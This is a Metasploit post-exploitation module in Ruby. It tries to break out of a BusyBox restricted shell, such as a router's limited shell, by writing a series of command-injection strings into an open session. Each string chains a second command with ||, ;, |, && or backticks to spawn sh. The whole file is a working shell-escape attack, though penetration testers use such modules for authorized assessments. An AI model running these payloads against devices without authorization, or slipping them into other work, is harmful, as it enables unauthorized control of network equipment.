##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  def initialize
    super(
      'Name'         => 'BusyBox Jailbreak ',
      'Description'  => 'This module will send a set of commands to a open
                         session that is connected to a BusyBox limited shell
                         (i.e. a router limited shell). It will try different
                         known tricks to try to jailbreak the limited shell and 
                         get a full sh busybox shell.',
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'http://vallejo.cc']
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    )    
  end



  def run
    
    bfound = false
    
    ############################################################method 1
    bfound = try_command("cat xx || sh\n","1_1") if bfound == false
    bfound = try_command("ping || sh\n","1_2") if bfound == false
    ############################################################method 2
    bfound = try_command("echo `sh >> /dev/ttyp0`\n","2_1") if bfound == false
    bfound = try_command("ping `sh >> /dev/ttyp0`\n","2_2") if bfound == false
    bfound = try_command("cat `sh >> /dev/ttyp0`\n","2_3") if bfound == false
    ############################################################method 3    
    bfound = try_command("cat xx;sh\n","3_1") if bfound == false
    bfound = try_command("echo xx;sh\n","3_2") if bfound == false
    bfound = try_command("ping;sh\n","3_3") if bfound == false
    ############################################################method 4
    bfound = try_command("cat xx | sh\n","4_1") if bfound == false
    bfound = try_command("ping | sh\n","4_2") if bfound == false
    ############################################################method 5
    bfound = try_command("cat ($sh)\n","5_1") if bfound == false
    bfound = try_command("echo ($sh) xx\n","5_2") if bfound == false
    bfound = try_command("ping ($sh)\n","5_3") if bfound == false
    ############################################################method 6
    bfound = try_command("cat xx &amp;&amp; sh\n","6_1") if bfound == false
    bfound = try_command("echo xx &amp;&amp; sh\n","6_2") if bfound == false
    bfound = try_command("ping &amp;&amp; sh\n","3_3") if bfound == false
    
  end
  
  def try_command(paramcommand, methodnumber)
      session.shell_write(paramcommand)
      resp = session.shell_read()
      print_msg(resp)    
      if ((resp.include? "BusyBox") && (resp.include? "Built-in shell"))
        print_msg("Done method " + methodnumber + ".\n")
        return true
      end  
      return false
  end
  
  def print_msg(msg, color=true)
    if not @stdio
      @stdio = Rex::Ui::Text::Output::Stdio.new
    end

    if color == true
      @stdio.auto_color
    else
        @stdio.disable_color
    end
    @stdio.print_raw(@stdio.substitute_colors(msg))
  end
  
  
end
